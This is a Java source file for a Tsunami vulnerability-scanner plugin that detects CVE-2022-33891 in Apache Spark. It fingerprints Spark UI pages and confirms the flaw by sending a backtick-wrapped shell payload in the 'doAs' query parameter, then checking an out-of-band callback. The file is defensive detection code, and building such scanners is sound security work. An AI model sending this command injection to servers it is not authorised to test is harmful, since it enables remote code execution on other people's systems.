/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202233891;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.plugins.detectors.cves.cve202233891.Annotations.OobSleepDuration;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A VulnDetector plugin for CVE 202233891. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2022-33891 Detector",
    version = "0.1",
    description = "Checks for occurrences of CVE-2022-33891 in Apache Spark installations.",
    author = "OccamsXor",
    bootstrapModule = Cve202233891VulnDetectorBootstrapModule.class)
@ForWebService
public final class Cve202233891VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private final int oobSleepDuration;

  private static final String FINGERPRINT_MASTER = "<title>Spark Master at ";
  private static final String FINGERPRINT_WORKER = "<title>Spark Worker at " ;

  @Inject
  Cve202233891VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator, @OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient =
        checkNotNull(httpClient, "HttpClient cannot be null.")
            .modify()
            .setFollowRedirects(false)
            .build();
    this.payloadGenerator = checkNotNull(payloadGenerator, "PayloadGenerator cannot be null.");
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isSpark)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  public boolean isSpark(NetworkService networkService) {
    try {
      String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
      HttpResponse response = this.httpClient.send(HttpRequest.get(targetUri).withEmptyHeaders().build());

      return response.status() == HttpStatus.OK && (
              response.bodyString().orElse("").contains(FINGERPRINT_MASTER)
                      || response.bodyString().orElse("").contains(FINGERPRINT_WORKER)
      );
    } catch (IOException e) {
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    // Check callback server is enabled
    if (!payloadGenerator.isCallbackServerEnabled()) {
      logger.atWarning().log("This detector needs the Callback Server to be available.");
      return false;
    }

    logger.atInfo().log("Callback server is available!");
    Payload payload = generateCallbackServerPayload();
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + "?doAs=`"
            + payload.getPayload()
            + "`";
    var request = HttpRequest.get(targetUri).withEmptyHeaders().build();

    try {
      this.httpClient.send(request, networkService);
      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(this.oobSleepDuration));
      return payload.checkIfExecuted();

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private Payload generateCallbackServerPayload() {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    return this.payloadGenerator.generate(config);
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2022_33891"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2022-33891 Apache Spark UI RCE")
                .setDescription(
                    "The Apache Spark UI has spark.acls.enable configuration option which provides"
                        + " capability to modify the application according to user's permissions."
                        + " When the config is true, the vulnerable versions of Spark checks the"
                        + " group membership of the user without proper controls, that results in"
                        + " blind command injection in username parameter.")
                .setRecommendation(
                    "You can upgrade your Spark instances to 3.2.2, or 3.3.0 or later"))
        .build();
  }
}
